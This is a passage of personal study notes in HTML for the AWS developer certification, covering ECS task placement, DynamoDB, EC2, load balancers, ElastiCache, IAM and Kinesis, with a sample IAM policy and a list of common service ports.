<li>Hardcoded - URLs for example</li>
<li>SSM Parameter Store - sensitive variables such as API keys</li>
<li>Secrets Manager - Sensitive variables</li>
</ul>
</li>
<li>Bind mounts</li>
<li>Essential Container
-If enabled: If one container in the task fails or stops, all the other containers in the task will stop</li>
</ul>
<h2 id="ecs-task-placement"><a class="header" href="#ecs-task-placement">ECS Task Placement</a></h2>
<ul>
<li>
<p>When a Task Definition for EC2 is created, ECS must determine where to schedule it</p>
</li>
<li>
<p>When a service scales in, ECS must determine which tasks to kill</p>
</li>
<li>
<p>To help with this, you can define a task placement strategy and task placement constraint</p>
</li>
<li>
<p>Task placement strategies and constraints <b>only work on EC2 launch types</b></p>
</li>
<li>
<p>How does this work?</p>
<ul>
<li>ECS will first determine where it is possible to place the task. Which nodes have enough resources?</li>
<li>ECS will then determine which EC2 instances satisfy the task placement constraints</li>
<li>ECS will then determine which EC2 instances satisfy the task placement strategy</li>
<li>ECS will then schedule the task</li>
</ul>
</li>
<li>
<p>Task Placement Strategies</p>
<ul>
<li>BinPack: Schedule tasks based on the least available amount of CPU or memory
<ul>
<li>i.e. <b>pack</b> as many containers as possible on a node before scheduling containers on other nodes</li>
</ul>
</li>
<li>Random: Place the task randomly</li>
<li>Spread: Spread instances across nodes based on a specified value (AZ, instanceId, etc.)</li>
</ul>
</li>
<li>
<p>Task Placement Constraints</p>
<ul>
<li>distinctInstance: Each task should be placed on a separate EC2 instance</li>
<li>memberOf: Schedule tasks on instances that satisfy an expression written in cluster query language ()</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dynamodb"><a class="header" href="#dynamodb">Dynamodb</a></h1>
<h2 id="introduction-7"><a class="header" href="#introduction-7">Introduction</a></h2>
<ul>
<li>Fully managed, highly available with replication across AZs</li>
<li>NoSQL Database</li>
<li>Scales to massive workloads, highly distributed database</li>
<li>Fully integrates with IAM</li>
<li>Enable event driven programming with DynamoDB streams</li>
</ul>
<h2 id="basics-1"><a class="header" href="#basics-1">Basics</a></h2>
<ul>
<li>DynamoDB is made of tables</li>
<li>Each table will have primary key (must be decided at creation time)</li>
<li>Each table can have an infinite number of rows (rows are items)
<ul>
<li>Each row can have a max of 400KB of data</li>
</ul>
</li>
</ul>
<h2 id="primary-keys"><a class="header" href="#primary-keys">Primary keys</a></h2>
<ul>
<li>how to choose a primary key?</li>
<li>Two types of primary keys
<ul>
<li>partition keys
<ul>
<li>Partition key must be unique for each item</li>
<li>Partition key must be ‚Äòdiverse‚Äô so that data is distributed</li>
</ul>
</li>
<li>partition key + sort key
<ul>
<li>data is grouped by partition key</li>
<li>each combination must be unique per item</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="readwrite-capacity-modes"><a class="header" href="#readwrite-capacity-modes">Read/Write Capacity Modes</a></h2>
<ul>
<li>Provisioned Mode
<ul>
<li>Provision all capacity in advance by providing values for RCU and WCU</li>
<li>Pay up front</li>
<li>Throughput can temporarily be exceeded using a burst capacity</li>
<li>If you exhaust the burst capacity, you can retry using exponential backoff</li>
</ul>
</li>
<li>On-demand Mode
<ul>
<li>Reads/writes scale on-demand</li>
<li>Pay for what you use</li>
</ul>
</li>
<li>You can switch between the two modes once every 24 hours</li>
</ul>
<h2 id="local-secondary-index"><a class="header" href="#local-secondary-index">Local Secondary Index</a></h2>
<ul>
<li>Alternate sort key for your table</li>
<li>Must be defined at table creation time</li>
<li>Up to 5 local secondary indexes per table</li>
<li>The sort key consists of one scaler attribute (string, number, or binary)</li>
</ul>
<h2 id="global-secondary-index"><a class="header" href="#global-secondary-index">Global Secondary Index</a></h2>
<ul>
<li>Alternative primary key from the base table</li>
</ul>
<h2 id="partiql"><a class="header" href="#partiql">PartiQL</a></h2>
<ul>
<li>Use SQL-like syntax to query DynamoDB tables</li>
</ul>
<h2 id="optimistic-locking"><a class="header" href="#optimistic-locking">Optimistic Locking</a></h2>
<ul>
<li>DynamoDB has a feature called ‚Äúconditional writes‚Äù to ensure an item has not changed before writing to it</li>
<li>Each item has an attribute that acts as a version number</li>
<li>Useful for when you have multiple writers attempters to write to an item</li>
</ul>
<h2 id="dynamodb-accelerator-dax"><a class="header" href="#dynamodb-accelerator-dax">DynamoDB Accelerator (DAX)</a></h2>
<ul>
<li>Fully managed, highly available, seamless in-memory cache for DynamoDB</li>
<li>Microseconds latency for cached reads and queries</li>
<li>Does not require that you change any application code</li>
<li>Solves the ‚Äúhot key‚Äù problem. If you read a specific key (item) too many times, you may get throttled.</li>
<li>5 minutes TTL for cache (default)</li>
<li>Up to 10 DAX nodes per cluster</li>
<li>Multi-AZ (3 nodes minimum recommended for production)</li>
<li>Secure (Encryption in transit and at rest)</li>
</ul>
<h2 id="dynamodb-streams"><a class="header" href="#dynamodb-streams">DynamoDB Streams</a></h2>
<ul>
<li>Streams are an ordered item-level modifications (create/update/delete) in a table</li>
<li>Stream records can be:
<ul>
<li>Sent to Kinesis Data Streams</li>
<li>Read by AWS Lambda</li>
<li>Read by Kinesis Client Library Apps</li>
</ul>
</li>
<li>Data retention for up to 24 hours</li>
<li>Use cases:
<ul>
<li>react to changes in real-time</li>
<li>Analytics</li>
<li>Insert into derivative tables</li>
<li>Insert into OpenSearch service</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ec2"><a class="header" href="#ec2">EC2</a></h1>
<h2 id="table-of-contents-1"><a class="header" href="#table-of-contents-1">Table of Contents</a></h2>
<ul>
<li><a href="#introduction-8">Introduction</a></li>
<li><a href="#budgets">Budgets</a></li>
<li><a href="#instance-types-1">Instance Types</a></li>
<li><a href="#security-groups-1">Security Groups</a></li>
<li><a href="#ec2-purchasing-options">EC2 Purchasing Options</a></li>
<li><a href="#ebs-volumes">EBS Volumes</a></li>
<li><a href="#ebs-volume-snapshots">EBS Volume Snapshots</a></li>
<li><a href="#ami-aws-machine-image">AMI (AWS Machine Image)</a></li>
<li><a href="#ec2-instance-store">EC2 Instance Store</a></li>
<li><a href="#ebs-volume-types">EBS Volume Types</a></li>
<li><a href="#ebs-multi-attach">EBS Multi-attach</a></li>
<li><a href="#efs">EFS</a></li>
<li><a href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></li>
<li><a href="#autoscaling-groups">Autoscaling Groups</a></li>
<li><a href="#imds">IMDS</a></li>
</ul>
<p><a id="Introduction"></a></p>
<h2 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h2>
<ul>
<li>EC2 is Amazon‚Äôs Elastic Compute Cloud</li>
<li>It is comprised of virtual machines, storage, load balancers, auto scaling VMs</li>
<li>You can run Windows, Linux, or MacOS</li>
<li>You can choose how many vCPUs and how much RAM you want</li>
<li>You can choose how much storage space you want</li>
<li>You can choose what type of network card and whether or not you need a public IP (Elastic IP)</li>
<li>You can run a bootstrap script at launch time called ‚Äúuser data‚Äù. The script is only run once when the instance first starts.</li>
<li>You can configure firewall rules via a Security Group</li>
</ul>
<p><a id="Budgets"></a></p>
<h2 id="budgets"><a class="header" href="#budgets">Budgets</a></h2>
<ul>
<li>You can create a budget and alert to ensure you don‚Äôt go over a certain cost</li>
<li>You need to enable ‚ÄúIAM user and role access to Billing information‚Äù in your account settings</li>
</ul>
<p><a id="instance-types"></a></p>
<h2 id="instance-types-1"><a class="header" href="#instance-types-1">Instance Types</a></h2>
<ul>
<li>General Purpose
<ul>
<li>Balance between compute, memory, and networking</li>
<li>Great for diversity of workloads such as web servers or code repositories</li>
</ul>
</li>
<li>Compute Optimized
<ul>
<li>Optimized for compute intensive tasks</li>
<li>Examples: Machine Learning, batch processing, HPC, etc.</li>
</ul>
</li>
<li>Memory Optimized
<ul>
<li>Optimized for memory intensive tasks</li>
<li>High performance databases or caches</li>
</ul>
</li>
<li>Storage Optimized
<ul>
<li>Example use cases: OLTP, databases, caches, etc.</li>
</ul>
</li>
<li>Accelerated Computing
<ul>
<li>HPC</li>
</ul>
</li>
</ul>
<p>Example:</p>
<pre><code>m5.2xlarge
| |   |
| |   +-- 2xlarge: size within instance class
| +------ 5: generation
+--------- m: instance class
</code></pre>
<p><a id="security-groups"></a></p>
<h2 id="security-groups-1"><a class="header" href="#security-groups-1">Security Groups</a></h2>
<ul>
<li>Security groups are like a firewall scoped to the EC2 instance</li>
<li>Security groups only contain allow rules</li>
<li>Security groups are stateful</li>
<li>Security groups can have a source of IP/range or another security group</li>
<li>An instance can have multiple security groups attached</li>
<li>A security group can be attached to multiple instances</li>
<li>Security groups are region-locked</li>
</ul>
<h4 id="ports-to-know-for-the-exam"><a class="header" href="#ports-to-know-for-the-exam">Ports to know for the exam</a></h4>
<ul>
<li>21 = FTP</li>
<li>22 = SSH/sFTP</li>
<li>80 = HTTP</li>
<li>443 = HTTPS</li>
<li>3389 = RDP</li>
<li>5432 - Postgresql</li>
<li>3306 - MySQL / MariaDB</li>
<li>1521 - Oracle</li>
<li>1433 - MSSQL</li>
</ul>
<h2 id="ec2-purchasing-options"><a class="header" href="#ec2-purchasing-options">EC2 Purchasing Options</a></h2>
<ul>
<li>On-Demand
<ul>
<li>Short workload, predictable pricing</li>
<li>Linux or Windows, billed per second. Other operation systems, billed per hour</li>
</ul>
</li>
<li>Reserved
<ul>
<li>1 to 3 years commitment</li>
<li>Used for long workloads</li>
<li>Up to a 72% discount compared to on-demand</li>
<li>Pay upfront, partially upfront, or no upfront</li>
<li>Scoped to a region or zone</li>
<li>You can buy or sell them in the Reserved Instances Marketplace</li>
</ul>
</li>
<li>Savings Plan
<ul>
<li>Up to a 72% discounted compared to on-demand</li>
<li>Commit to a certain type of usage (example: $10/hour for 1 to 3 years). Usage beyond the commitment is billed at the on-demand price</li>
<li>Locked to a specific instance family and AWS region (example: M5 in us-east-1)</li>
<li>1 to 3 years commitment</li>
<li>Commit to an amount of usage</li>
</ul>
</li>
<li>Spot Instances
<ul>
<li>Short workloads, cheap, less reliable</li>
<li>The MOST cost efficient option</li>
<li>Workload must be resilient to failure</li>
</ul>
</li>
<li>Dedicated Hosts
<ul>
<li>Reserve an entire physical server, control instance placement</li>
<li>Allows you to address compliance or license requirements</li>
<li>Purchasing Options:
<ul>
<li>On-demand</li>
<li>Reserved for 1 to 3 years</li>
</ul>
</li>
<li>The most expensive option</li>
</ul>
</li>
<li>Dedicated Instances
<ul>
<li>No other customers will share your hardware</li>
<li>You may share the hardware with other instances in the same account</li>
<li>No control over the instance placement</li>
</ul>
</li>
<li>Capacity Reservation
<ul>
<li>Reserve capacity in a specific AZ for any duration</li>
<li>You always have access to the EC2 capacity when you need it</li>
<li>No time reservations</li>
<li>Combine with regional reserved instances or a savings plan for cost savings</li>
<li>Even if you don‚Äôt launch instances, you still get charged</li>
</ul>
</li>
</ul>
<h2 id="ebs-volumes"><a class="header" href="#ebs-volumes">EBS Volumes</a></h2>
<ul>
<li>AN EBS (Elastic Block Store) Volume is a network drive which you can attach to you instances while they run</li>
<li>EBS volumes are bound to a specific Availability Zone
<ul>
<li>To move an EBS volume to another AZ, you must first snapshot it and then copy the snapshot</li>
</ul>
</li>
<li>EBS volumes have a provisioned capacity
<ul>
<li>You are billed for the provisioned capacity</li>
</ul>
</li>
<li>IOPS typically scale with capacity (i.e. larger volumes have better performance)</li>
<li>EBS volumes have a ‚ÄúDelete on Termination‚Äù attribute. This is enabled for the root volume by default, but not for other volumes</li>
</ul>
<h2 id="ebs-volume-snapshots"><a class="header" href="#ebs-volume-snapshots">EBS Volume Snapshots</a></h2>
<ul>
<li>To move an EBS volume to another AZ, you must first snapshot it and then copy the snapshot</li>
<li>EBS Snapshot Archive
<ul>
<li>Gives you the ability to move snapshots to the archive tier, which is up to 75% cheaper</li>
<li>Takes 24-72 hours to restore the snapshot</li>
</ul>
</li>
<li>EBS Snapshot Recycle Bin
<ul>
<li>Allows you to restore deleted snapshot</li>
<li>Retention can be 1 day to 1 year</li>
</ul>
</li>
<li>Fast Snapshot Restore
<ul>
<li>Force full initialization of snapshot to have to latency on first use</li>
<li>can be very expensive</li>
</ul>
</li>
</ul>
<h2 id="ami-aws-machine-image"><a class="header" href="#ami-aws-machine-image">AMI (AWS Machine Image)</a></h2>
<ul>
<li>
<p>VM Image</p>
</li>
<li>
<p>AMI‚Äôs are built for a specific region and can be copied to other regions</p>
</li>
<li>
<p>AMI Types:</p>
<ul>
<li>Private</li>
<li>Public</li>
<li>MarketPlace</li>
</ul>
</li>
<li>
<p>AMI Creation Process</p>
<ul>
<li>Start instance and customize it</li>
<li>Stop the instance</li>
<li>Capture the AMI</li>
</ul>
</li>
</ul>
<h2 id="ec2-instance-store"><a class="header" href="#ec2-instance-store">EC2 Instance Store</a></h2>
<ul>
<li>Storage mounted in an EC2 instance that is local to the physical host</li>
<li>High performance</li>
<li>The storage is wiped when the EC2 instance stops or is terminated</li>
<li>Use cases: cache, temporary content, or scratch space</li>
</ul>
<h2 id="ebs-volume-types"><a class="header" href="#ebs-volume-types">EBS Volume Types</a></h2>
<ul>
<li>
<p>GP2/GP3 - General SSD</p>
<ul>
<li>1 GB up to 16 TB</li>
</ul>
</li>
<li>
<p>IO1/IO2 - High performance SSD</p>
</li>
<li>
<p>ST1 (hdd) - low cost HDD volume</p>
</li>
<li>
<p>SC1 (hdd) - Lowest cost HDD volume</p>
</li>
<li>
<p>Only GP2/3 and IO1/2 can be used as root (bootable) volumes</p>
</li>
</ul>
<h2 id="ebs-multi-attach"><a class="header" href="#ebs-multi-attach">EBS Multi-attach</a></h2>
<ul>
<li>Attach the same EBS volume to multiple instances (up to 16) in the same AZ</li>
<li>Only available for IO1/IO2 family of EBS volumes</li>
<li>Each instance will have read/write access to the volume</li>
<li>You must use a file system that is cluster aware</li>
</ul>
<h2 id="efs"><a class="header" href="#efs">EFS</a></h2>
<ul>
<li>
<p>Managed NFS (Network File System)</p>
</li>
<li>
<p>Pay per use</p>
</li>
<li>
<p>3x more expensive than a GP2 EBS volume</p>
</li>
<li>
<p>Can be mounted on different EC2 instances in different Availability Zones</p>
</li>
<li>
<p>EFS Scale</p>
<ul>
<li>1000s of concurrent clients, 10 GB+ throughput</li>
<li>Grow to petabyte scale network file system, automatically</li>
<li>Performance Classes:
<ul>
<li>Performance Mode:
<ul>
<li>General purpose: latency sensitive use cases (web server, CMS, etc‚Ä¶)</li>
<li>Max I/O: higher latency, throughput, highly parallel (big data, media processing)</li>
</ul>
</li>
<li>Throughput Mode:
<ul>
<li>Bursting: 1 TB= 50MB/s + burst up to 100MB/s</li>
<li>Provisioned - set your throughput regardless of storage size</li>
<li>Elastic - Automatically scales throughput up or down based on your workloads</li>
</ul>
</li>
</ul>
</li>
<li>Storage Classes:
<ul>
<li>Storage Tiers (move files to another tier after ‚Äòx‚Äô number of days)
<ul>
<li>Standard</li>
<li>Infrequent Access</li>
<li>Archive</li>
</ul>
</li>
<li>Implement lifecycle policies to move files between tiers</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="elastic-load-balancer-elb"><a class="header" href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></h2>
<ul>
<li>
<p>Load balancers forward traffic to multiple backend servers</p>
</li>
<li>
<p>ELB is a managed load balancer</p>
</li>
<li>
<p>ELB is integrated with many offerings and services ()</p>
</li>
<li>
<p>ELB supports health checks to verify if a backend instance is working before forwarding traffic to it</p>
</li>
<li>
<p>Types of load balancers on AWS:</p>
<ul>
<li>
<p>Application Load Balancer</p>
<ul>
<li>Layer 7
<ul>
<li>Support HTTP2 and WebSockets</li>
</ul>
</li>
<li>Supports HTTP redirects</li>
<li>Supports URL path routing, hostname routing, query string routing, header routing</li>
<li>Backend instances are grouped into a Target Group</li>
<li>You get a fixed hostname</li>
<li>The app servers don‚Äôt see the IP of the client directly
<ul>
<li>If the app servers need to know the client IP/port/protocol, they can check the following headers:
<ul>
<li>X-Forwarded-For</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Port</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Network Load Balancer</p>
<ul>
<li>Layer 4
<ul>
<li>Supports UDP and TCP</li>
</ul>
</li>
<li>High performance</li>
<li>One static IP per availability zone</li>
</ul>
</li>
<li>
<p>Gateway Load Balancer</p>
<ul>
<li>Layer 3</li>
<li>Used for 3rd party network appliances on AWS, example: Firewalls</li>
<li>Extremely high performance</li>
<li>Supports the GENEVE protocol</li>
</ul>
</li>
<li>
<p>Target Groups</p>
<ul>
<li>EC2 Instances</li>
<li>ECS Tasks</li>
<li>Lambda Functions</li>
<li>Private IP addresses</li>
</ul>
</li>
<li>
<p>Sticky Sessions</p>
<ul>
<li>
<p>Cookie Names</p>
<ul>
<li>Application-based cookies
<ul>
<li>Custom Cookie
<ul>
<li>Generated by the target</li>
<li>Can include any custom attributes required by the application</li>
<li>Cookie name must be specified individually for each target group</li>
<li>You cannot use AWSALB, AWSALBAPP, or AWSALBTG (these are reserved by the ELB)</li>
</ul>
</li>
<li>Application Cookie
<ul>
<li>Generated by the load balancer</li>
<li>Cookie name is AWSALBAPP</li>
</ul>
</li>
</ul>
</li>
<li>Duration-based Cookie
<ul>
<li>Cookie generated by the load balancer</li>
<li>Cookie name is AWSALB for ALB, AWSELB for CLB</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Cross-zone load balancing</p>
<ul>
<li>Each load balancer instance distributes traffic evenly across all registered instances in all availability zones</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="autoscaling-groups"><a class="header" href="#autoscaling-groups">Autoscaling Groups</a></h2>
<ul>
<li>Scale out EC2 instances to match increased load or scale in to match a decreased load</li>
<li>Specify parameters to have a minimum and maximum number of instances</li>
<li>Automatically replace failed instances</li>
<li>Uses a launch template</li>
</ul>
<h2 id="imds"><a class="header" href="#imds">IMDS</a></h2>
<ul>
<li>IMDSv1 vs. IMDSv2
<ul>
<li>IMDSv1 is accessing http://169.254.169.254/latest/meta-data directly</li>
<li>IMDSv2 is more secure and is done in two steps
<ol>
<li>get a Session token</li>
<li>Use session token in the IMDSv2 calls</li>
</ol>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elasticache"><a class="header" href="#elasticache">Elasticache</a></h1>
<h2 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h2>
<ul>
<li>Fully managed Redis or Memcached instances</li>
<li>Caches are in-memory databases with high-performance and low latency</li>
<li>Helps to reduce load from databases</li>
<li>Helps to make your application stateless</li>
<li>Requires that your application be architected with a cache in-mind</li>
</ul>
<h2 id="redis"><a class="header" href="#redis">Redis</a></h2>
<ul>
<li>Supports multi-AZ with auto-failover</li>
<li>Supports read-replicas to scale out reads</li>
<li>Backup and restore features</li>
<li>Supports sets and sorted sets</li>
</ul>
<h2 id="memcached"><a class="header" href="#memcached">Memcached</a></h2>
<ul>
<li>Multi-node for partitioning of data (Sharding)</li>
<li>None of the features that Redis supports</li>
</ul>
<h2 id="caching-implementation-considerations"><a class="header" href="#caching-implementation-considerations">Caching Implementation Considerations</a></h2>
<ul>
<li>Is it safe to cache the data?
<ul>
<li>Data may be out of date (eventually consistent)</li>
</ul>
</li>
<li>Is caching effective for that data?
<ul>
<li>Patterns: data changing slowly, few keys are frequently updated</li>
<li>Anti patterns: data changing rapidly, all large key space frequently needed</li>
</ul>
</li>
<li>Is data structured for caching?
<ul>
<li>example: key value caching or caching of aggregations result</li>
</ul>
</li>
</ul>
<h2 id="caching-design-patterns"><a class="header" href="#caching-design-patterns">Caching design patterns</a></h2>
<h3 id="lazy-loading--cache-aside--lazy-population"><a class="header" href="#lazy-loading--cache-aside--lazy-population">Lazy Loading / Cache-Aside / Lazy Population</a></h3>
  <img src="clouds/aws/dva-c02/images/caching-1.png" width="77%" height="40%" />
  <img src="clouds/aws/dva-c02/images/caching-2.png" width="77%" height="40%" />
<h3 id="write-through"><a class="header" href="#write-through">Write-through</a></h3>
  <img src="clouds/aws/dva-c02/images/caching-3.png" width="77%" height="40%" />
  <img src="clouds/aws/dva-c02/images/caching-4.png" width="77%" height="40%" />
<h2 id="cache-evictions-and-ttl"><a class="header" href="#cache-evictions-and-ttl">Cache Evictions and TTL</a></h2>
<ul>
<li>Cache eviction can occur in 3 ways:
<ul>
<li>You delete the item in the cache</li>
<li>Item is evicted because the memory is full and its not in use (LRU)</li>
<li>The TTL (time to live) has expired
<ul>
<li>TTL can range from a few seconds to days</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="iam"><a class="header" href="#iam">IAM</a></h1>
<h4 id="table-of-contents-2"><a class="header" href="#table-of-contents-2">Table of Contents</a></h4>
<ul>
<li><a href="#Introduction-1">Introduction</a></li>
<li><a href="#Users-and-Groups">Users and Groups</a></li>
<li><a href="#IAM-Policies">IAM Policies</a></li>
<li><a href="#Password-Policy">Password Policies</a></li>
<li><a href="#MFA">MFA</a></li>
<li><a href="#IAM-Roles">IAM Roles</a></li>
<li><a href="#IAM-Security-Tools">IAM Security Tools</a></li>
</ul>
<hr>
<p><a id="Introduction-1"></a></p>
<h2 id="introduction-10"><a class="header" href="#introduction-10">Introduction</a></h2>
<ul>
<li>IAM is Identity and Access Management</li>
<li>IAM is a global service</li>
<li>Do not use the root account, create user accounts instead</li>
</ul>
<p><a id="Users-and-Groups"></a></p>
<h2 id="users-and-groups"><a class="header" href="#users-and-groups">Users and Groups</a></h2>
<ul>
<li>Groups can only contain users, not other groups</li>
<li>Users do not need to belong to a group. Users can belong to multiple groups</li>
</ul>
<p><a id="IAM-Policies"></a></p>
<h2 id="iam-policies"><a class="header" href="#iam-policies">IAM Policies</a></h2>
<ul>
<li>
<p>Users and groups can be assigned a policy called an IAM policy. IAM policies are JSON documents:</p>
<pre><code>    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "EnableDisableHongKong",
                "Effect": "Allow",
                "Action": [
                    "account:EnableRegion",
                    "account:DisableRegion"
                ],
                "Resource": "*",
                "Condition": {
                    "StringEquals": {"account:TargetRegion": "ap-east-1"}
                }
            },
            {
                "Sid": "ViewConsole",
                "Effect": "Allow",
                "Action": [
                    "account:ListRegions"
                ],
                "Resource": "*"
            }
        ]
    }
</code></pre>
</li>
<li>
<p>IAM policy inheritance</p>
<ul>
<li>inline policies are attached directly to users</li>
<li>If an IAM policy is attached to a group, any users in that group will inherit settings from the policy</li>
</ul>
<img src="clouds/aws/dva-c02/images/iam-policy-explanation.png" width="77%" height="40%" />
</li>
</ul>
<p><a id="Password-Policy"></a></p>
<h2 id="password-policy"><a class="header" href="#password-policy">Password Policy</a></h2>
  <img src="clouds/aws/dva-c02/images/iam-pass-policy.png" width="77%" height="40%" />
<p><a id="MFA"></a></p>
<h2 id="mfa-multi-factor-authentication"><a class="header" href="#mfa-multi-factor-authentication">MFA (Multi-factor authentication)</a></h2>
<ul>
<li>Virtual MFA device
<ul>
<li>Google Authenticator</li>
<li>Authy</li>
</ul>
</li>
<li>Universal 2nd Factor Security Key
<ul>
<li>Ubikey</li>
</ul>
</li>
<li>Hardware Key Fob
<ul>
<li>Also has a special option for GovCloud</li>
</ul>
</li>
</ul>
<p><a id="IAM-Roles"></a></p>
<h2 id="iam-roles"><a class="header" href="#iam-roles">IAM Roles</a></h2>
<ul>
<li>Allows AWS service to perform actions on your behalf. When creating the role, you choose which service the role will apply to (For example, EC2)</li>
<li>Assign permissions to AWS services with IAM roles</li>
</ul>
<p><a id="IAM-Security-Tools"></a></p>
<h2 id="iam-security-tools"><a class="header" href="#iam-security-tools">IAM Security Tools</a></h2>
<ul>
<li>IAM Credentials Report
<ul>
<li>A report that lists all user accounts and status of their credentials</li>
</ul>
</li>
<li>IAM Access Advisor
<ul>
<li>Access advisor shows the service permissions granted to a user and when those services were last accessed</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kinesis"><a class="header" href="#kinesis">Kinesis</a></h1>
<h2 id="introduction-11"><a class="header" href="#introduction-11">Introduction</a></h2>
<ul>
<li>Kinesis is a set of services provided by AWS
<ul>
<li>Kinesis Data Streams: capture, process, and store data streams</li>
<li>Kinesis Data Firehose: load data streams into AWS data stores</li>
<li>Kinesis Data Analytics: analyze data streams with SQL or Apache Flink</li>
<li>Kinesis Video Streams: Capture, process and store video streams</li>
</ul>
</li>
</ul>
<h2 id="kinesis-data-firehose"><a class="header" href="#kinesis-data-firehose">Kinesis Data Firehose</a></h2>
<ul>
<li>Records up to 1 MB can be sent to Kinesis Data Firehose and Firehose will then batch writees to other resources in <b>near real-time</b></li>
<li>Fully managed by AWS, autoscales</li>
<li>Pay only for the data going through Firehose</li>
<li>Producers such as (Applications, Kinesis Agent, Kinesis Data Streams, CloudWatch, AWS IoT) can write to Firehose, and Firehose will then send the data to S3, RedShift, or OpenSearch</li>
<li>Data Firehose can also send to 3rd parties such as Splunk, Datadog, etc.</li>
<li>You can transform data using Lambda functions before sending it to the destination</li>
</ul>
<h1 id="kinesis-streams"><a class="header" href="#kinesis-streams">Kinesis Streams</a></h1>
<p>Collect and process large streams of data in real-time.</p>
<h2 id="use-cases"><a class="header" href="#use-cases">Use Cases:</a></h2>
<ul>
<li>Fast (second/millisecond latency) processing of log events</li>
<li>Real-time metrics and reporting</li>
<li>Data analytics</li>
<li>Complex stream processing</li>
</ul>
<h2 id="kinesis-libraries--tools"><a class="header" href="#kinesis-libraries--tools">Kinesis Libraries / Tools:</a></h2>
<h3 id="producing-data"><a class="header" href="#producing-data">Producing Data:</a></h3>
<ul>
<li>
<p><strong>Kinesis Producer Library (KPL)</strong></p>
<ul>
<li>Blog post: Implementing Efficient and Reliable Producers with the Amazon Kinesis Producer Library</li>
<li>Auto-retry configurable mechanism</li>
<li>Supports two complementary ways of batching:
<ul>
<li><strong>Collection (of stream records):</strong>
<ul>
<li>Buffers/collects records to write multiple records to multiple shards in a single request.</li>
<li><code>RecordMaxBufferedTime</code>: max time a record may be buffered before a request is sent. Larger = more throughput but higher latency.</li>
</ul>
</li>
<li><strong>Aggregation (of user records):</strong>
<ul>
<li>Combines multiple user records into a single Kinesis stream record (using PutRecords API request).</li>
<li>KCL integration (for deaggregating user records).</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Kinesis Agent</strong></p>
<ul>
<li>Standalone application that you can install on the servers you‚Äôre interested in.</li>
<li>Features:
<ul>
<li>Monitors file patterns and sends new data records to delivery streams</li>
<li>Handles file rotation, checkpointing, and retry upon failure</li>
<li>Delivers all data in a reliable, timely, and simpler manner</li>
<li>Emits CloudWatch metrics for monitoring and troubleshooting</li>
<li>Allows preprocessing data, e.g., converting multi-line record to single line, converting from delimiter to JSON, converting from log to JSON.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-streams-api"><a class="header" href="#kinesis-streams-api">Kinesis Streams API:</a></h3>
<h4 id="reading-data"><a class="header" href="#reading-data">Reading Data:</a></h4>
<ul>
<li><strong>Kinesis Client Library (KCL)</strong>
<ul>
<li>The KCL ensures there is a record processor running and processing each shard.</li>
<li>Uses a DynamoDB table to store control data. It creates one table per application that is processing data.</li>
<li>Creates a worker thread for each shard. Auto-assigns shards to workers (even workers on different EC2 instances).</li>
<li><strong>KCL Checkpointing</strong>
<ul>
<li>Last processed record sequence number is stored in DynamoDB.</li>
<li>On worker failure, KCL restarts from last checkpointed record.</li>
<li>Supports deaggregation of records aggregated with KPL.</li>
<li>Note: KCL may be bottlenecked by DynamoDB table (throwing Provisioned Throughput Exceptions). Add more provisioned throughput to the DynamoDB table if needed.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="emitting-data"><a class="header" href="#emitting-data">Emitting Data:</a></h4>
<ul>
<li><strong>Kinesis Connector Library (Java) for KCL</strong>
<ul>
<li>Connectors for: DynamoDB, Redshift, S3, Elasticsearch.</li>
<li>Java library with the following steps/interfaces:
<ul>
<li><code>iTransformer</code>: maps from stream records to user-defined data model.</li>
<li><code>iFilter</code>: removes irrelevant records.</li>
<li><code>iBuffer</code>: buffers based on size limit and total byte count.</li>
<li><code>iEmitter</code>: sends the data in the buffer to AWS services.</li>
<li><code>S3Emitter</code>: writes buffer to a single file.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kinesis-stream-api"><a class="header" href="#kinesis-stream-api">Kinesis Stream API:</a></h3>
<ul>
<li><strong>PutRecord</strong> (single record per HTTP request)</li>
<li><strong>PutRecords</strong> (multiple records per single HTTP request). Recommended for higher throughput.
<ul>
<li>Single record failure does not stop the processing of subsequent records.</li>
<li>Will return HTTP 200 as long as some records succeed (even when others failed).</li>
<li>Retry requires application code in the producer to examine the <code>PutRecordsResult</code> object and retry whichever records failed.</li>
</ul>
</li>
</ul>
<h2 id="key-concepts"><a class="header" href="#key-concepts">Key Concepts</a></h2>
<h3 id="kinesis-data-streams"><a class="header" href="#kinesis-data-streams">Kinesis Data Streams:</a></h3>
<ul>
<li>
<p>Stream big data into AWS</p>
</li>
<li>
<p><a href="https://docs.aws.amazon.com/streams/latest/dev/key-concepts.html#partition-key">Kinesis Data Streams</a></p>
</li>
<li>
<p>A stream is a set of shards. Each shard is a sequence of data records.</p>
<ul>
<li>Shards are numbered (shard1, shard2, etc.)</li>
</ul>
</li>
<li>
<p>Each data record has a sequence number that is assigned automatically by the stream.</p>
</li>
<li>
<p>A data record has 3 parts:</p>
<ul>
<li>Sequence number</li>
<li>Partition key</li>
<li>Data blob (immutable sequence of bytes, up to 1000KB).</li>
</ul>
</li>
<li>
<p>Sequence number is only unique within its shard.</p>
</li>
<li>
<p><strong>Retention Period:</strong></p>
<ul>
<li>Retention for messages within a Data Stream can be set to 1 - 365 days</li>
<li>You pay more for longer retention periods.</li>
</ul>
</li>
<li>
<p>Consumers and Producers</p>
<ul>
<li>producers send data (records) into data streams
